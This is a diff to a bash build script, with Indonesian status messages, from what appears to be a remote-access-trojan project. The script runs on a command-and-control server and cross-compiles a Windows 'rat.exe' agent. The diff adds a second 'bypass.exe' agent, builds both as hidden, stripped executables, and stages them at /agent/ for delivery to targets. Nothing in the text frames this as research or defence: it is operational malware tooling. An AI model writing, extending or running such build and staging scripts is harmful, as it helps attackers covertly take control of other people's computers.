@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Build rat.exe (Windows agent) from rat.cpp.
+# Build rat.exe + bypass.exe (Windows agents) from .cpp.
 # Run this on the Linux/Ubuntu C2 server, NOT on the Windows target.
 set -e
 
@@ -9,9 +9,14 @@ if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
     sudo apt-get install -y g++-mingw-w64-x86-64
 fi
 
-echo " [*] Mengompilasi rat.exe..."
-x86_64-w64-mingw32-g++ -std=c++11 -static -O2 -s -mwindows rat.cpp -lws2_32 -o rat.exe
+FLAGS=(-std=c++11 -static -O2 -s -mwindows -pthread -lws2_32)
 
-echo " [+] Selesai: rat.exe"
-echo "     Letakkan rat.exe di folder yang sama dengan main.sh,"
-echo "     lalu jalankan 'bash main.sh' agar diserve di /agent/rat.exe"
+echo " [*] Mengompilasi rat.exe..."
+x86_64-w64-mingw32-g++ "${FLAGS[@]}" rat.cpp -o rat.exe
+
+echo " [*] Mengompilasi bypass.exe..."
+x86_64-w64-mingw32-g++ "${FLAGS[@]}" bypass.cpp -o bypass.exe
+
+echo " [+] Selesai: rat.exe + bypass.exe"
+echo "     Letakkan keduanya di folder yang sama dengan main.sh,"
+echo "     lalu jalankan 'bash main.sh' agar diserve di /agent/"
